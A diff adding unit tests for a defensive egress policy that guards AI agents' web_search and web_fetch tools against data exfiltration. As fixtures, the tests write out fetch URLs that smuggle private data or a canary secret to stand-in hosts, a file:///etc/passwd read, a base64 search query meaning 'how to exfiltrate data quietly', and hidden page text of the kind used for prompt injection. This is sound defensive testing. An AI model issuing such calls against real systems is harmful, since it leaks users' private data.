@@ -138,3 +138,78 @@ class CampaignDetectorTests(unittest.TestCase):
         self.assertGreater(r["campaign_detector_blocked"], 0)
         self.assertTrue(r["benign_unrelated_request_allowed"])
         self.assertEqual(template_fingerprint("Explain topic 101 now"), template_fingerprint("Explain  topic 202 now"))
+
+
+class WebSearchExfiltrationTests(unittest.TestCase):
+    """Rall et al., arXiv 2510.09093: the agent's own web search / fetch tool as the exfiltration channel."""
+
+    def setUp(self):
+        from model_mountain.egress import EgressPolicy
+        self.policy = EgressPolicy(allowed_domains=("acme.example",))
+
+    def taint(self, **kw):
+        from model_mountain.egress import SessionTaint
+        return SessionTaint(**kw)
+
+    def test_search_result_url_is_allowed_even_in_tainted_session(self):
+        from model_mountain.egress import check_tool_call
+        url = "https://suppliers.example.org/valves?page=2"
+        r = check_tool_call("web_fetch", {"url": url}, self.policy,
+                            self.taint(private_data_read=True, untrusted_content_seen=True, known_urls=(url + "#top",)))
+        self.assertEqual(r["decision"], "allow")
+        self.assertEqual(r["channel"], "open_web_retrieval")
+
+    def test_model_built_url_with_parameters_after_private_read_is_denied(self):
+        from model_mountain.egress import check_tool_call
+        r = check_tool_call("web_fetch", {"url": "https://collector.example.net/v1?d=supplier-terms-q3"}, self.policy,
+                            self.taint(private_data_read=True))
+        self.assertEqual(r["decision"], "deny")
+        self.assertIn("model_constructed_url_with_parameters_after_private_data_read", r["reasons"])
+
+    def test_secret_in_fetch_url_is_denied_without_private_read_flag(self):
+        from model_mountain.egress import check_tool_call
+        r = check_tool_call("web_fetch", {"url": "https://x.example.net/?k=CANARY-DEMO-7Q2X9"}, self.policy, self.taint())
+        self.assertEqual(r["decision"], "deny")
+
+    def test_unvetted_plain_url_in_lethal_trifecta_needs_approval(self):
+        from model_mountain.egress import check_tool_call
+        r = check_tool_call("web_fetch", {"url": "https://news.example.com/"}, self.policy,
+                            self.taint(private_data_read=True, untrusted_content_seen=True))
+        self.assertEqual(r["decision"], "require_human_approval")
+
+    def test_ordinary_search_allowed_but_opaque_token_query_denied(self):
+        from model_mountain.egress import check_tool_call
+        ok = check_tool_call("web_search", {"query": "industrial valve suppliers Germany"}, self.policy,
+                             self.taint(private_data_read=True))
+        self.assertEqual(ok["decision"], "allow")
+        bad = check_tool_call("web_search", {"query": "status aG93X3RvX2V4ZmlsdHJhdGVfZGF0YV9xdWlldGx5"}, self.policy,
+                              self.taint(private_data_read=True))
+        self.assertEqual(bad["decision"], "deny")
+        self.assertIn("high_entropy_token_in_search_query", bad["reasons"])
+
+    def test_non_http_and_credentialed_urls_refused(self):
+        from model_mountain.egress import check_tool_call
+        for url in ("file:///etc/passwd", "https://user:pw@example.com/"):
+            r = check_tool_call("web_fetch", {"url": url}, self.policy, self.taint())
+            self.assertIn("unsafe_url_form:url", r["reasons"])
+
+    def test_hidden_page_text_is_flagged_and_stripped(self):
+        from model_mountain.egress import hidden_page_text, strip_hidden_page_text
+        html = ('<p>Visible intro.</p><p style="color:#ffffff;background:#ffffff">hidden note</p>'
+                '<div style="display: none">also hidden</div><p style="color:#333">normal grey</p>')
+        hidden = hidden_page_text(html)
+        self.assertEqual([h["text"] for h in hidden], ["hidden note", "also hidden"])
+        visible = strip_hidden_page_text(html)
+        self.assertIn("Visible intro.", visible)
+        self.assertIn("normal grey", visible)
+        self.assertNotIn("hidden", visible)
+
+    def test_lab_reports_web_search_fixtures(self):
+        from model_mountain.defenses import run_lab, INCIDENTS
+        lab = run_lab()
+        cases = {c["case"]: c["verdict"] for c in lab["egress"]["cases"]}
+        self.assertEqual(cases["web_fetch_search_result"], "allow")
+        self.assertEqual(cases["web_fetch_model_built_url"], "deny")
+        self.assertEqual(cases["web_fetch_secret_in_query"], "deny")
+        self.assertEqual(lab["egress"]["retrieved_page"]["verdict"], "quarantine")
+        self.assertIn("web-search-exfil", {i["id"] for i in INCIDENTS})
